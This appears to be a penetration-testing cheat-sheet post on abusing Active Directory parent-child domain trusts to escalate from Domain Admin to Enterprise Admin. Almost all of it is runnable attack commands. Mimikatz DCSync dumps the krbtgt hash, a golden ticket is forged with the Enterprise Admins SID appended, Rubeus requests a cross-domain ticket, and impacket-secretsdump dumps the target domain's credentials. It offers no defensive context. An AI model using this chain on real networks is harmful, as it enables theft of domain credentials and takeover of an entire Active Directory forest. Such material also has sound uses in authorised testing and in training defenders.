---
title: "Abuse Parent Child Domain Trusts"
date: 2024-7-2
tags: ["kerberos", "da", "ea", "active directory", "ad", "domain controller", "Windows", "golden ticket", "privesc", "mimikatz", "rubeus", "trusts"]
---

---
### Privesc from DA to EA

#### 1. Check direction and target

```powershell
Get-ADTrust -Filter *
```

```powershell
# Or
nltest /domain_trusts
```

```powershell
# Or
([System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()).GetAllTrustRelationships()
```

#### 2. Get current and target domain SID

```powershell
./mimikatz.exe 'lsadump::trust' 'exit'
```

#### 3. Get krbtgt hash of current domain

```powershell
./mimikatz.exe 'lsadump::dcsync /all /csv' 'exit'
```

#### 4. Forge a golden ticket

```powershell
# Append '-519' to target domain SID
./mimikatz.exe 'kerberos::golden /user:Administrator /rc4:<HASH> /domain:CURRENT.EXAMPLE.COM /sid:<CURRENT_DOMAIN_SID> /sids:<TARGET_DOMAIN_SID>-519 /ticket:c:\windows\tasks\ticket.kirbi' 'exit'
```

<small>*Note: May need to try different high value hashes*</small>

#### 5. Request a tgt ticket of target domain

```powershell
./rubeus.exe asktgs /service:cifs/TARGET.EXAMPLE.COM /domain:EXAMPLE.COM /dc:DC01.EXAMPLE.COM /ticket:c:\windows\tasks\ticket.kirbi /outfile:c:\windows\tasks\ticket_2.kirbi /nowrap
```

#### 6. Convert kirbi to ccache (Back to Linux)

[RubeusToCcache](https://github.com/SolomonSklash/RubeusToCcache)

```bash
python3 rubeustoccache.py <base64_encoded_ticket> secrets.kirbi secrets.ccache
```

#### 7. Dump Secrets

```bash
export KRB5CCNAME=secrets.ccache
```

```bash
impacket-secretsdump administrator@target.example.com -k -no-pass
```

<br>